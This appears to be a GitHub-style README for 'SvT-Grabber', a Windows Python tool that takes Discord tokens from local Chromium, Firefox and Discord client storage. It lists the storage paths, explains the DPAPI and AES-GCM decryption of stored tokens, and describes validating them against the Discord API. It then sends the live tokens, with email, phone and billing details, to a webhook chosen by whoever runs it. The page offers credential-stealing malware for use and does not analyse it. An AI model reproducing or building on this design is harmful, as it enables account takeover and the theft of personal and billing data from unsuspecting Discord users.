<div align="center">

# SvT-Grabber

**Extract, decrypt and validate Discord tokens from local browser storage — then ship them to a webhook.**

Windows · Python 3.10+ · no external binaries

[![Python](https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-windows-A855F7)](#requirements)
[![License](https://img.shields.io/badge/license-MIT-38BDF8)](#license)

</div>

---

## What it does

SvT-Grabber walks the local storage of Chromium-based browsers and the Discord client, decrypts the stored Discord tokens, checks each one against the Discord API, and posts the live ones to a webhook of your choice.

It runs offline up to the validation step. Nothing is uploaded unless a token actually authenticates.

## How it works

1. **Locate** — reads the browser profile directories (see the table below).
2. **Unwrap the master key** — `Local State` holds an AES-256-GCM key, base64-encoded behind a `DPAPI` prefix. It's decrypted with `CryptUnprotectData` under the current Windows user.
3. **Decrypt** — LevelDB `.ldb`/`.log` files are scanned for `v10`/`v11` blobs; nonce is bytes 3–15, ciphertext follows, last 16 bytes are the GCM tag.
4. **Extract** — tokens are pulled out with a strict regex (`24-28.6.25-110` and `mfa.80-90`), duplicates removed.
5. **Validate** — `GET /api/v10/users/@me` with each token; only `200` responses survive.
6. **Exfiltrate** — valid tokens are POSTed to the configured webhook as an embed, with user tag, ID, email, phone flag, Nitro type, billing and the token itself.

## Supported sources

| Source | Path |
|---|---|
| Discord client | `%APPDATA%\discord\Local Storage\leveldb` |
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data` |
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data` |
| Brave | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data` |
| Opera / Opera GX | `%APPDATA%\Opera Software\Opera Stable` |
| Vivaldi | `%LOCALAPPDATA%\Vivaldi\User Data` |
| Yandex | `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data` |
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles\*\storage\default\https+++discord.com\ls\data.sqlite` (plaintext) |

Every path is checked; missing browsers are skipped quietly.

## Features

- Decrypts `v10`/`v11` AES-GCM tokens via DPAPI master key
- Handles `mfa.` tokens
- Reads Firefox `data.sqlite` without decryption
- Validates every token before sending — dead tokens are dropped
- Pulls account metadata (email, phone, Nitro, billing) for each hit
- Webhook delivery as a formatted embed
- Deduplication across all sources
- Optional console output only, no webhook required

## Requirements

- **Windows** (DPAPI is Windows-only)
- Python 3.10+
- `pycryptodome`, `pywin32`, `requests`

```bash
pip install -r requirements.txt
